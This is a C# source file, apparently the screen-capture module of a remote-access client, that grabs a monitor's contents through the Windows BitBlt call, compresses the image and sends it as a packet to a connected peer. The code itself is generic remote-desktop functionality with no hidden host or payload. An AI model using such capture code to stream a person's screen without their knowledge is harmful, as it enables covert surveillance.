using celestialC.Helper.Services.compression;
using System;
using System.Collections.Generic;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Runtime.InteropServices;
using System.Windows.Forms;

namespace celestialC.Helper
{
    public static class GdiController
    {
        [DllImport("gdi32.dll", EntryPoint = "BitBlt", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        internal static extern bool BitBlt([In] IntPtr hdc, int nXDest, int nYDest, int nWidth, int nHeight,
        [In] IntPtr hdcSrc, int nXSrc, int nYSrc, int dwRop);

        [DllImport("gdi32.dll")]
        internal static extern IntPtr CreateDC(string lpszDriver, string lpszDevice, string lpszOutput,
            IntPtr lpInitData);

        [DllImport("gdi32.dll")]
        internal static extern bool DeleteDC([In] IntPtr hdc);
        // ReSharper disable once InconsistentNaming
        private const int SRCCOPY = 0x00CC0020;

        private static Bitmap _currentImage;
        private static IntPtr _scrDeviceContext;
        private static Rectangle _boundsRectangle;

        public static void Dispose()
        {
            _currentImage?.Dispose();
            if (_scrDeviceContext != IntPtr.Zero)
                DeleteDC(_scrDeviceContext);

            _currentImage = null;
            _scrDeviceContext = IntPtr.Zero;
        }

        public static bool Initialize(int monitor)
        {
            try
            {
                _scrDeviceContext = CreateDC("DISPLAY", null, null, IntPtr.Zero);
                ChangeMonitor(monitor);
                return true;
            }
            catch { }
            return false;
        }

        public static void ChangeMonitor(int monitor)
        {
            _boundsRectangle = Screen.AllScreens[monitor].Bounds;

            _currentImage?.Dispose();
            _currentImage = new Bitmap(_boundsRectangle.Width, _boundsRectangle.Height, PixelFormat.Format32bppArgb);
        }

        public static void sendScreenShot(IStreamCodec streamCodec)
        {
            using (var graphics = Graphics.FromImage(_currentImage))
            {
                var deviceContext = graphics.GetHdc();
                BitBlt(deviceContext, 0, 0, _boundsRectangle.Width, _boundsRectangle.Height,
                    _scrDeviceContext, _boundsRectangle.X, _boundsRectangle.Y, SRCCOPY);
                graphics.ReleaseHdc(deviceContext);

                var bitmapData = _currentImage.LockBits(new Rectangle(0, 0, _currentImage.Width, _currentImage.Height),
                    ImageLockMode.ReadOnly, _currentImage.PixelFormat);

                byte[] ImageBytes = null;
                try
                {
                    ImageBytes = streamCodec.CodeImage(bitmapData.Scan0, Screen.AllScreens[0].Bounds, _currentImage.Size,
                        _currentImage.PixelFormat).ToArray();
                }
                finally
                {
                    _currentImage?.UnlockBits(bitmapData);
                }
                if (ImageBytes == null) return;
                List<byte> ToSend = new List<byte>();
                ToSend.Add((int)DataType.ImageType);
                ToSend.AddRange(ImageBytes);
                PacketSender.Send(ToSend.ToArray());
            }
        }
    }
}
